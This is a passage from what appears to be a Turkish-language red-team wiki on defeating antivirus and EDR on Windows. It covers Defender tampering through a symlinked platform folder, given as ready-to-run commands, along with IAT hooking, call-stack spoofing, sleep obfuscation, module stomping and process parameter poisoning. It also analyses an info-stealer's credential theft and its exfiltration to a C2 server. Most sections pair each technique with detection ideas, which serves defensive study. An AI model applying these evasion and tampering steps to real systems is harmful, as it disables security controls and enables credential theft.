- ClipUp'ın yazdığı içerikleri yerleştirme dışında kontrol edemezsiniz; primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir service'i kurmak/başlatmak ve reboot penceresine sahip olmak için local admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock'larını önler.

Tespitler
- Özellikle boot sırasında, alışılmadık argümanlarla çalıştırılan `ClipUp.exe` process creation olayları; özellikle parent process'i standart olmayan launcher'lar ise.
- Şüpheli binary'leri auto-start olarak yapılandıran ve Defender/AV'den önce tutarlı şekilde başlayan yeni service'ler. Defender startup failures öncesindeki service oluşturma/değişikliklerini araştırın.
- Defender binary'leri/Platform dizinlerinde file integrity monitoring; protected-process flag'lerine sahip process'ler tarafından beklenmeyen file creation/modification olayları.
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan process'leri ve AV dışı binary'ler tarafından kullanılan anomalous PPL level'larını arayın.

Azaltımlar
- WDAC/Code Integrity: hangi signed binary'lerin PPL olarak ve hangi parent process'ler altında çalışabileceğini kısıtlayın; ClipUp invocation'ını meşru context'ler dışında engelleyin.
- Service hygiene: auto-start service'lerinin oluşturulmasını/değiştirilmesini kısıtlayın ve start-order manipulation'ı izleyin.
- Defender tamper protection ve early-launch protections'ın etkin olduğundan emin olun; binary corruption'a işaret eden startup error'larını araştırın.
- Ortamınızla uyumluysa security tooling barındıran volume'larda 8.3 short-name generation'ı devre dışı bırakmayı değerlendirin (kapsamlı şekilde test edin).

PPL ve tooling referansları
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack ile Microsoft Defender'a Tampering

Windows Defender, çalışacağı platformu şu konumun altındaki subfolder'ları enumerate ederek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek lexicographic version string'e sahip subfolder'ı (ör. `4.18.25070.5-0`) seçer, ardından Defender service process'lerini buradan başlatır (service/registry path'lerini buna göre günceller). Bu seçim, directory reparse point'leri (symlink'ler) dahil olmak üzere directory entry'lerine güvenir. Bir administrator, Defender'ı attacker-writable bir path'e yönlendirmek ve DLL sideloading veya service disruption elde etmek için bundan yararlanabilir.

Ön koşullar
- Local Administrator (Platform folder altında directory/symlink oluşturmak için gerekir)
- Reboot yapabilme veya Defender platform re-selection'ını tetikleyebilme (boot sırasında service restart)
- Yalnızca built-in tools gerekir (mklink)

Neden çalışır
- Defender kendi folder'larına yapılan write işlemlerini engeller; ancak platform selection directory entry'lerine güvenir ve target'ın protected/trusted path'e çözümlendiğini doğrulamadan lexicographically en yüksek version'ı seçer.

Adım adım (örnek)
1) Mevcut platform folder'ının writable bir clone'unu hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe'nin (WinDefend) redirected path'ten çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` altındaki yeni process path'i ve service configuration/registry'nin bu konumu yansıttığını gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender'ın application directory'sinden yüklediği DLL'leri bırakarak/değiştirerek Defender process'lerinde code execution gerçekleştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink'i kaldırın; böylece bir sonraki başlatmada configured path çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu tekniğin tek başına privilege escalation sağlamadığını unutmayın; admin rights gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team'ler, runtime evasion'ı C2 implant'ından çıkarıp hedef modülün içine taşıyabilir; bunun için modülün Import Address Table'ını (IAT) hook'lar ve seçilen API'leri attacker-controlled, position-independent code (PIC) üzerinden yönlendirir. Bu yaklaşım, evasion'ı birçok kit'in sunduğu küçük API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lar ile post-exploitation DLL'lerine de genişletir.

High-level approach
- Reflective loader kullanarak hedef modülün yanında bir PIC blob stage edin (prepend edilmiş veya companion). PIC self-contained ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR üzerinden ilerleyin ve hedeflenen import'lar (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) için IAT entry'lerini thin PIC wrapper'lara işaret edecek şekilde patch'leyin.
- Her PIC wrapper, gerçek API'ye tail-call yapmadan önce evasion'ları çalıştırır. Tipik evasion'lar şunlardır:
- Call etrafında memory mask/unmask uygulama (ör. beacon region'larını encrypt etme, RWX→RX, page name/permission'larını değiştirme), ardından call sonrası geri yükleme.
- Call-stack spoofing: benign bir stack oluşturun ve target API'ye geçiş yapın; böylece call-stack analysis beklenen frame'leri çözümler.
- Uyumluluk için bir interface export edin; böylece bir Aggressor script (veya eşdeğeri) Beacon, BOF'lar ve post-ex DLL'leri için hangi API'lerin hook'lanacağını register edebilir.

Why IAT hooking here
- Hook'lanmış import'u kullanan tüm code için çalışır; tool code'unu değiştirmeyi veya belirli API'leri proxy'lemesi için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary* hook'lamak, modül yüklemelerini intercept etmenizi (ör. System.Management.Automation.dll, clr.dll) ve aynı masking/stack evasion'ı bunların API call'larına uygulamanızı sağlar.
- CreateProcessA/W'yi wrap ederek call-stack-based detection'lara karşı process-spawning post-ex command'lerinin güvenilir kullanımını geri getirir.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking işlemini gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch işleminden önce yakaladığınız original IAT değerinden veya LdrGetProcedureAddress üzerinden resolve edin.
- PIC için RW → RX geçişleri kullanın ve writable+executable sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları sahte bir call chain oluşturur (return address'ler benign modüllerin içine işaret eder) ve ardından gerçek API'ye pivot eder.
- Bu, Beacon/BOF'lardan sensitive API'lere giden canonical stack'leri bekleyen detection'ları etkisiz hâle getirir.
- API prologue'undan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operational integration
- PIC ve hook'ların DLL yüklendiğinde otomatik olarak initialize olması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
- Beacon ve BOF'ların code değişikliği olmadan aynı evasion path'ten şeffaf şekilde yararlanması için bir Aggressor script kullanarak target API'leri register edin.

Detection/DFIR considerations
- IAT integrity: non-image (heap/anon) adreslerine resolve olan entry'ler; import pointer'larının periyodik doğrulanması.
- Stack anomalies: loaded image'lara ait olmayan return address'ler; non-image PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: IAT üzerinde in-process write işlemleri, import thunk'larını değiştiren erken DllMain activity'si, load sırasında oluşturulan beklenmeyen RX bölgeleri.
- Image-load evasion: hooking LoadLibrary* kullanılıyorsa, memory masking event'leriyle ilişkili şüpheli automation/clr assembly load işlemlerini izleyin.

Related building blocks and examples
- Load sırasında IAT patching gerçekleştiren reflective loader'lar (ör. TitanLdr, AceLdr)
- Memory masking hook'ları (ör. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (ör. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden custom bir resolver ile değiştirerek import'ları **`ProcessImports()` sırasında** hook'layabilirsiniz:

- Transient loader PIC kendisini free ettikten sonra da hayatta kalan bir **resident PICO** (persistent PIC object) oluşturun.
- Loader'ın import resolver'ını overwrite eden bir `setup_hooks()` function'ı export edin (ör. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'larını atlayın ve `__resolve_hook(ror13hash(name))` gibi hash-based bir hook lookup kullanın. Bir hook varsa onu return edin; aksi hâlde gerçek `GetProcAddress`'e delegate edin.
- Hook target'larını link time'da Crystal Palace `addhook "MODULE$Func" "hook"` entry'leriyle register edin. Hook, resident PICO'nun içinde bulunduğu için geçerliliğini korur.

Bu yöntem, loaded DLL'nin code section'ını load sonrasında patch'lemeden **import-time IAT redirection** sağlar.

### Forcing hookable imports when the target uses PEB-walking

Import-time hook'lar yalnızca function target'ın IAT'sinde gerçekten bulunuyorsa tetiklenir. Bir modül API'leri PEB-walk + hash üzerinden resolve ediyorsa (import entry yoksa), loader'ın `ProcessImports()` path'inin bunu görmesi için gerçek bir import zorlayın:

- Hashed export resolution'ı (ör. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir reference ile değiştirin.
- Compiler bir IAT entry üretir ve reflective loader import'ları resolve ederken interception mümkün olur.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep` patch'lemek yerine implant'ın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun wait'ler için çağrıyı, idle sırasında in-memory image'ı encrypt eden Ekko tarzı bir obfuscation chain içine wrap edin:

- `NtContinue`'u crafted `CONTEXT` frame'leriyle çağıran bir callback sequence planlamak için `CreateTimerQueueTimer` kullanın.
- Tipik chain (x64): image'ı `PAGE_READWRITE` olarak ayarlayın → full mapped image üzerinde `advapi32!SystemFunction032` ile RC4 encrypt uygulayın → blocking wait gerçekleştirin → RC4 decrypt uygulayın → PE section'ları walk ederek **per-section permission'ları restore edin** → completion sinyali gönderin.
- `RtlCaptureContext` bir template `CONTEXT` sağlar; bunu birden fazla frame'e clone edin ve her adımı invoke etmek için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operational detail: Uzun wait'ler için (ör. `WAIT_OBJECT_0`) “success” return edin; böylece image maskelenmişken caller devam eder. Bu pattern, idle window'ları sırasında modülü scanner'ların gizler ve klasik “patched `Sleep()`” signature'ından kaçınır.

Detection ideas (telemetry-based)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback burst'leri.
- Büyük, contiguous ve image-size'ındaki buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
- Custom per-section permission restoration tarafından takip edilen geniş aralıklı `VirtualProtect`.

### Runtime CFG registration for sleep-obfuscation gadgets

CFG-enabled target'larda `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump genellikle process'i `STATUS_STACK_BUFFER_OVERRUN` ile crash ettirir; çünkü gadget modülün CFG metadata'sında bulunmaz. Ekko/Kraken tarzı chain'leri hardened process'ler içinde çalışır durumda tutmak için:

- Chain tarafından kullanılan her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` entry'leriyle register edin.
- Loaded image'ların (`ntdll`, `kernel32`, `advapi32`) içindeki adreslerde `MEMORY_RANGE_ENTRY`, **image base** ile başlamalı ve **full image size**'ı kapsamalıdır.
- Manually mapped/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak erişilen export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target olacak attacker-controlled executable section'ları da mark edin.

Bu, ROP/JOP tarzı sleep chain'lerini “yalnızca non-CFG process'lerde çalışır” durumundan çıkarıp `explorer.exe`, browser'lar, `svchost.exe` ve `/guard:cf` ile derlenmiş diğer endpoint'ler için yeniden kullanılabilir bir primitive'e dönüştürür.

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement gürültülüdür ve CET Shadow Stack sistemlerinde bozulabilir; çünkü spoof edilmiş `Rip` yine de hardware shadow stack ile uyumlu olmalıdır. Daha güvenli bir sleep-masking pattern'i şöyledir:

- Aynı process içindeki başka bir thread'i seçin ve `NtQueryInformationThread` üzerinden thread'in `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) değerlerini okuyun.
- Mevcut thread'in gerçek TEB/TIB değerlerini backup edin.
- Gerçek sleeping context'i `GetThreadContext` ile capture edin.
- Gerçek `Rip`'in **yalnızca kendisini** spoof context'e copy edin; spoof edilmiş `Rsp`/stack state'i olduğu gibi bırakın.
- Sleep window sırasında, stack walker'ların legitimate bir stack range içinde unwind etmesi için spoof thread'in `NT_TIB` değerini current TEB'e copy edin.
- Wait tamamlandıktan sonra original TIB ve thread context'i restore edin.

Bu yöntem CET ile uyumlu bir instruction pointer korurken, TEB stack metadata'sına güvenerek unwind'leri doğrulayan EDR stack walker'larını yanıltır.

### APC-based alternative: Kraken Mask

Timer-queue dispatch çok signature'lıysa, aynı sleep-encrypt-spoof-restore sequence'i queued APC'ler kullanan suspended bir helper thread'den execute edilebilir:

- Entrypoint olarak `NtTestAlert` bulunan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile queue edin ve `NtAlertResumeThread` ile drain edin.
- Default 64 KB thread stack'ini tüketmemek için chain state'i helper stack yerine heap üzerinde saklayın.
- Start event'ini atomik olarak signal etmek ve block olmak için `NtSignalAndWaitForSingleObject` kullanın.
- Bir scanner'ın half-restored stack yakalayabileceği race window'u azaltmak için TIB/context'i restore etmeden önce main thread'i suspend edin (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` signature'ını helper-thread/APC signature'ı ile değiştirir.

Additional detection ideas
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile kullanılan `NtSetInformationVirtualMemory`.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında wrap edilen `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` sonrasında current thread'in TEB/TIB stack bounds değerlerine yapılan direct write işlemleri.
- Indirect olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain'leri.
- Signed modüller içinde dispatch pivot olarak kısa gadget signature'larının (ör. `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`)) tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, obvious private executable memory allocate etmek veya yeni bir sacrificial DLL load etmek yerine payload'ları target process içinde zaten map edilmiş bir DLL'nin **`.text` section'ından** execute eder. Overwrite target, payload'ı process'in hâlâ ihtiyaç duyduğu code path'leri bozmadan barındırabilecek **loaded, disk-backed image** olmalıdır.

### Reliable target selection

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere karşı naive stomping kırılgandır: DLL remote process'te yüklü olmayabilir ve çok küçük bir code region process'in crash olmasına neden olur. Daha reliable bir workflow:

1. Target process modüllerini enumerate edin ve yalnızca hâlihazırda loaded olan DLL'lerden oluşan **names-only include list** tutun.
2. Önce payload'ı build edin ve **exact byte size** değerini kaydedin.
3. Aday DLL'leri disk üzerinde scan edin ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştırın. Bu, file size'dan daha önemlidir; çünkü executable section'ın **memory'ye map edildiğindeki** boyutunu yansıtır.
4. **Export Address Table'ı (EAT)** parse edin ve stomp start offset olarak bir exported function RVA seçin.
5. **Blast radius**'ı hesaplayın: payload seçilen function boundary'yi aşarsa memory'de onun sonrasında yerleştirilmiş adjacent export'ların üzerine yazacaktır.

Wild'de görülen tipik recon/selection helper'ları:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operasyonel notlar
- `LoadLibrary`/beklenmedik image load telemetry’sinden kaçınmak için uzak process’te **zaten yüklenmiş** DLL’leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export’ları tercih edin; aksi takdirde normal code path’leri thread oluşturulmadan önce veya sonra stomp edilmiş byte’lara erişebilir.
- Büyük implant’lar, tüm buffer’ın injector source içinde doğru şekilde temsil edilmesi için shellcode embedding yönteminin bir string literal’den **byte-array/braced initializer** yapısına değiştirilmesini gerektirebilir.

Detection fikirleri
- Daha yaygın private RWX/RX allocation’lar yerine **image-backed executable page**’lere (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan remote write işlemleri.
- Bellekteki byte’ları diskteki backing file ile artık eşleşmeyen export entry point’leri.
- İlk byte’ları kısa süre önce değiştirilmiş meşru bir DLL export’u içinde çalışmaya başlayan remote thread’ler veya context pivot’ları.
- DLL `.text` page’lerine yönelik, ardından thread creation gelen şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` sequence’leri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write path’ini (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Zaten çalışan bir hedefe byte kopyalamak yerine, Windows’un seçili `CreateProcessW` startup parametrelerini child process’e **kopyalaması** ve bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması gerçeğini kötüye kullanır.

### `CreateProcessW` tarafından kopyalanan Poisonable carrier’lar

Kullanışlı carrier’lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **writable memory**’yi göstermelidir ve null terminator dahil **32.767 Unicode karakter** ile sınırlıdır.
- `lpEnvironment`, ardışık `NAME=VALUE\0` string’lerinden oluşan ve ekstra bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmi olarak reserved olduğundan, `ShellInfo` mapping’i sabit ve belgelenmiş bir contract yerine bir implementation detail olarak değerlendirilmelidir.

Bu, normal process creation’ı **payload-transfer primitive** haline getirir. Operator, child process’i attacker-controlled startup data ile oluşturur ve Windows’un cross-process copy işlemini gerçekleştirmesine izin verir.

### Remote write API’leri olmadan remote lookup flow’u

Child oluşturulduktan sonra, kopyalanan buffer’ı **read-only** primitive’ler ile resolve edin:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`’i okuyun
3. `PEB.ProcessParameters`’ı takip edin
4. `RTL_USER_PROCESS_PARAMETERS`’ı okuyun
5. Seçilen pointer’ı kullanın:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kopyalanan parameter buffer'ı çalıştırma

Kopyalanan parameter bölgesi genellikle `RW` durumundadır ve executable değildir. Yaygın bir P3 chain şu şekildedir:

1. Process'i normal şekilde oluşturun (suspended olarak değil)
2. Seçilen parameter page'i `NtProtectVirtualMemory` / `VirtualProtectEx` ile executable hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen main thread handle'ını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i overwrite ederek) ile execution'ı yönlendirin

Klasik thread hijacking workflow'larının aksine bu işlem `SuspendThread` / `ResumeThread` gerektirmez; context, döndürülen main thread handle'ı üzerinden doğrudan değiştirilebilir.

Bu yöntem, injection için yaygın olarak izlenen çeşitli API'lerden kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null-byte sınırlaması ve staged shellcode

Her üç carrier da **string veya string-benzeri data** olduğundan, `0x00` içeren raw payload transfer sırasında truncate edilir. Pratik bir workaround, constant'ları runtime sırasında yeniden oluşturan ve ardından arbitrary bir second stage yükleyen **null-free first stage** kullanmaktır.

Basit bir pattern, XOR tabanlı constant synthesis'tir:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Bu, first stage'in taşınan parametreye null byte eklemeden stack string'leri, API argümanlarını, DLL path'lerini veya second-stage shellcode loader'ını oluşturmasını sağlar.

### First stage'den stack tabanlı API çağrıları

First stage'in `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'ine push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` register'larını sabitlere veya `RSP`-relative pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

Ardından second stage stack'ten bir `PAGE_READWRITE` allocation'ına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX allocation kullanmadan bu bölgeye jump edilebilir.

### Detection fikirleri

Yazarların belirttiği iyi hunting fırsatları:

- **process-parameter pages** üzerinde `VirtualProtectEx` / `NtProtectVirtualMemory` ile execute permission etkinleştirilmesi
- bu protection değişikliğinin ardından `SetThreadContext` / `NtSetContextThread` kullanılması
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` için yapılan remote read işlemleri
- process creation sırasında olağandışı derecede uzun veya yüksek entropy'li `lpCommandLine`, `lpEnvironment` ya da `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, tek başına tam bir execution primitive değil, **cross-process transfer trick**'idir: kopyalanan parametrenin hâlâ execute permission değişikliğine ve bir execution redirection yöntemine ihtiyacı vardır.
- `RtlCreateProcessReflection` / Dirty Vanity, `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere dahili olarak ulaştığı için yazarlar tarafından değerlendirildi ancak reddedildi.

## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft'ı

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access yöntemlerini tek bir workflow içinde nasıl birleştirdiğini gösterir.

### Keyboard layout gating ve sandbox delay

- Bir config flag'i (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla kurulu keyboard layout'larını enumerate eder. Cyrillic bir layout bulunursa sample boş bir `CIS` marker'ı bırakır ve stealer'ları çalıştırmadan terminate olur; böylece hariç tutulan locale'lerde hiçbir zaman detonate olmazken bir hunting artifact bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A, process listesi üzerinde dolaşır, her adı özel bir rolling checksum ile hash'ler ve sonucu debugger/sandbox blocklist'leriyle karşılaştırır; checksum işlemini computer name üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B, system properties'i (process-count floor, recent uptime) inceler, VirtualBox additions'ı tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping'i tespit etmek üzere sleep işlemleri çevresinde timing kontrolleri gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE, diske bırakılan veya memory üzerinde manuel olarak map edilen bir Chromium credential helper içerir; fileless mode, hiçbir helper artifact'i yazılmaması için import ve relocation işlemlerini kendisi çözer.
- Bu helper, ikinci aşama DLL'ini ChaCha20 ile iki kez şifrelenmiş şekilde saklar (iki adet 32-byte key + 12-byte nonce). Her iki pass tamamlandıktan sonra blob'u reflectively load eder (`LoadLibrary` kullanılmaz) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.
- ChromElevator rutinleri, canlı bir Chromium browser'a inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption key'lerini devralır ve ABE hardening'e rağmen password'leri/cookie'leri/credit card'ları doğrudan SQLite database'lerinden decrypt eder.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer table üzerinde dolaşır ve etkin her modül için bir thread oluşturur (Telegram, Discord, Steam, screenshots, documents, browser extensions vb.). Her thread sonuçları shared buffer'lara yazar ve yaklaşık 45 saniyelik join window sonrasında file count değerini bildirir.
- Tamamlandıktan sonra her şey, statically linked `miniz` library kullanılarak `%TEMP%\\Log.zip` olarak zip'lenir. Ardından `ThreadPayload1` 15 saniye sleep eder ve arşivi HTTP POST üzerinden 10 MB'lık chunk'lar halinde `http://<C2>:6767/upload` adresine stream eder; browser `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) spoof eder. Her chunk `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı `w: <campaign_tag>` header'larını ekler; son chunk ise C2'nin reassembly işleminin tamamlandığını bilmesi için `complete: true` ekler.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
